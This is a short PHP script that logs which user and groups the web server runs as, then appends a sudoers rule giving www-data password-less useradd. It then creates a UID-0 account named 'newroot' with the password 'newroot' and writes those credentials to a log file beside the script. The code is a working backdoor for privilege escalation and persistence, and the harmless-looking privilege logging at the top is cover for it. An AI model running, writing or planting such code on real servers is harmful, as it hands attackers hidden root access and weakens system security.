<?php
// Get the current user
$user = posix_getpwuid(posix_geteuid());
$username = $user['name'];

// Check if the user is root
$is_root = ($username === 'root');

// Get the groups the user belongs to
$groups = posix_getgroups();
$group_info = '';
foreach ($groups as $gid) {
    $group = posix_getgrgid($gid);
    $group_info .= $group['name'] . ',';
}
$group_info = rtrim($group_info, ',');

// Get the directory path of the current script
$script_dir = dirname(__FILE__);

// Set the log file path in the same directory as the script
$log_file = $script_dir . '/privilege_check.log';

// Log the privilege information
$log_message = "PHP is running as user: $username\n";
$log_message .= "Is root: " . ($is_root ? 'Yes' : 'No') . "\n";
$log_message .= "Groups: $group_info\n";
$log_message .= "------------------------\n";
file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

// Modify the /etc/sudoers file to grant password-less sudo access to www-data for useradd
$sudoers_file = '/etc/sudoers';
$sudoers_entry = "\n# Allow www-data to run useradd without a password\nwww-data ALL=(ALL) NOPASSWD: /usr/sbin/useradd\n";
file_put_contents($sudoers_file, $sudoers_entry, FILE_APPEND | LOCK_EX);

// Create a new admin user with username and password set to "newroot"
$new_username = 'newroot';
$password = 'newroot';
$command = "sudo useradd -ou 0 -g 0 -s /bin/bash -p $(openssl passwd -1 '$password') $new_username";
system($command);

// Log the new admin user creation
$log_message = "New admin user '$new_username' created with password: $password\n";
$log_message .= "------------------------\n";
file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);
?>
